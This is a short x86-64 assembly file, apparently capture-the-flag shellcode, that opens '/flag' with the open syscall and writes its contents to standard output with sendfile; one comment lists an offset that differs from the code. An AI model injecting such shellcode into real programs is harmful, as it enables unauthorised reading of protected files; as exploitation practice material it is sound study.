.intel_syntax noprefix

.section .text
.global _start

_start:
    xor rax, rax
    mov rax, 0x67616c662f
    push rax
    # open('/flag', NULL, NULL)
    lea rdi, [rsp]
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall

    # sendfile(1, flag_fd, 1, 1000)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall
